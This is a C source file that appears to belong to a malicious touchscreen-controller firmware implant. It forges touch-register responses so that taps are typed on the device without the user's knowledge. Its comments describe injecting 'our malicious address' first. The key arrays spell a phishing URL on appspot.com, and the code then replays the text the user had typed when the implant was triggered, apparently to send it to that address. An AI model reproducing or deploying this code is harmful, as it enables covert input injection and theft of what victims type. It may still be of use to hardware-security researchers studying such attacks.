#include "touch_injection_URL.h"

/*
 * prefix_0xc_URL & prefix_0x8_URL:
 * 	Predefined arrys for the prefix injections
 */
static const uint8_t* const prefix_0xc_URL[] = {
		reg_0xc_tentouches, reg_0xc_finish,
		reg_0xc_tentouches, reg_0xc_finish,
		reg_0xc_fourtouches, reg_0xc_finish,

};
static const uint8_t* const prefix_0x8_URL[] = {
		Press__DOT_smashphis, TouchEND_ten,
		Press_h_DOT_appspot_DOT_, TouchEND_ten,
		Press_com_SLASH_, TouchEND_four,
};

/*
 * Initializing start point for the script.
 */
static const uint8_t** iter0xc_URL = (const uint8_t**) prefix_0xc_URL;
static const uint8_t** iter0x8_URL = (const uint8_t**) prefix_0x8_URL;


/*
 * Switcher Flag :
 *	Switch between modes. We want every iteration to behave differently.
 */
static uint8_t switcher_flag = 0 ;

/*
 * Prefix Stage:
 * 	Indicating that we are on the Prefix Stage
 * 	which means that we are injecting our malicious address first.
 */
static uint8_t PrefixStage = 1;

/*
 * How Much Types To Inject:
 * 	Indicating how much types got captured when we got Triggered!
 */
static uint8_t HowMuchTypesWhenTriggered = 0 ;

/*
 * Index Of Type To Inject:
 * 	Indicating the index of the type we want to inject in this iteration.
 */
static uint8_t IndexOfTypeToInject = 0;

/*
 * Terminate :
 * 	Indicating if we finished to inject types.
 */
static uint8_t terminate = 0;

/*
 * _0x8_buffer:
 * 	Buffer for the injection answer.
 * 	2 (delay and size) + 80 (data) = 82 bytes
 */
static uint8_t _0x8_buffer[82];

/*
 * _0xc_table:
 * 	Predefined table for all 0xc arrays we need/can replay.
 */
static uint8_t _0xc_table[11][4] = {
		{00, 02, 0b00000000, 0b00},
		{00, 02, 0b00000001, 0b00},
		{00, 02, 0b00000011, 0b00},
		{00, 02, 0b00000111, 0b00},
		{00, 02, 0b00001111, 0b00},
		{00, 02, 0b00011111, 0b00},
		{00, 02, 0b00111111, 0b00},
		{00, 02, 0b01111111, 0b00},
		{00, 02, 0b11111111, 0b00},
		{00, 02, 0b11111111, 0b01},
		{00, 02, 0b11111111, 0b11}
};


const uint8_t* getInfo(uint8_t c){
	for(uint8_t i = 0 ; i < 31 ; i++){
		if(array_of_keys[i][0] == c) return array_of_keys[i];
	}
	return 0;
}


const uint8_t* get_injection_URL(uint8_t reg)
{
	uint8_t leftedLetters = (HowMuchTypesWhenTriggered-IndexOfTypeToInject);
	if (reg == 0x6) {
		return reg_0x6;
	}
	if(PrefixStage)
	{
		if (reg == 0xc)
		{
			iter0xc_URL++;
			return *(iter0xc_URL - 1);
		}
		else if (reg == 0x8)
		{
			iter0x8_URL++;
			if(*(iter0x8_URL - 1) == TouchEND_four)
			{
				PrefixStage = 0;
			}
			return *(iter0x8_URL - 1);
		}
	}
	else
	{
		printf("\r\nHowMuchTypesWhenTriggered = %d\r\n", HowMuchTypesWhenTriggered);
		printf("IndexOfTypeToInject = %d\r\n", IndexOfTypeToInject);
		if(!terminate){
			if(switcher_flag){
				if (reg == 0xc) {
					if(leftedLetters > 10 )
					{
						return reg_0xc_tentouches;
					}
					else
					{
						return (const uint8_t*) _0xc_table[leftedLetters] ;
					}
				}
				else if (reg == 0x8) {
					switcher_flag = 0;
					uint8_t letter_at_buffer = leftedLetters ;
					if(leftedLetters > 10)
						letter_at_buffer = 10;

					_0x8_buffer[0] = NORAML_DELAY ;
					_0x8_buffer[1] = letter_at_buffer * 8 ;
					for(uint8_t i = 0 ; i < letter_at_buffer ; i++){
						uint8_t c = getLetterFromBuff(IndexOfTypeToInject + i);
						const uint8_t* info = getInfo(c);
						for(int j = 0 ; j < 8 ; j++){
							_0x8_buffer[((i*8)+j)+2] = info[j+1];
						}
					}
					/*
					for(int i = 0; i < sizeof(_0x8_buffer); i++) {
					    printf("%d ", _0x8_buffer[i]);
					    if((i+2) % 8 == 0)
					    	printf("\r\n");
					}*/

					IndexOfTypeToInject += letter_at_buffer;
					printf("IndexOfTypeToInject = %d\r\n",IndexOfTypeToInject);
					return _0x8_buffer;
				}
			}
			else
			{
				if (reg == 0xc)
				{
					return reg_0xc_finish;
				}
				else if (reg == 0x8)
				{
					switcher_flag = 1;
					for(uint8_t i = 2 ; i < 82 ; i++)
					{
						_0x8_buffer[i] = 0;
					}
					if(IndexOfTypeToInject >= HowMuchTypesWhenTriggered)
					{
						terminate = 1;
						printf("current index = %d\r\n", IndexOfTypeToInject);
						printf("current size = %d\r\n", HowMuchTypesWhenTriggered);
					}
					return _0x8_buffer;
				}
			}
		}
		else
		{
			if (reg == 0xc)
			{
				printf("%s %d\r\n",__FUNCTION__, __LINE__);
				return stop_signal;
			}
			else if (reg == 0x8)
			{
				printf("%s %d\r\n",__FUNCTION__, __LINE__);
				return stop_signal;
			}
		}

	}
	return 0;
}


void init_injector_URL(){
	HowMuchTypesWhenTriggered = getTypedSize();
	switcher_flag = 1 ;
	terminate = 0;
	IndexOfTypeToInject = 0;
	PrefixStage = 1;
	printf("The number typed : %d\r\n",HowMuchTypesWhenTriggered);
}



void destroy_injection_URL() {
	iter0xc_URL = (const uint8_t**) prefix_0xc_URL;
	iter0x8_URL = (const uint8_t**) prefix_0x8_URL;
	resetBuffer();
}
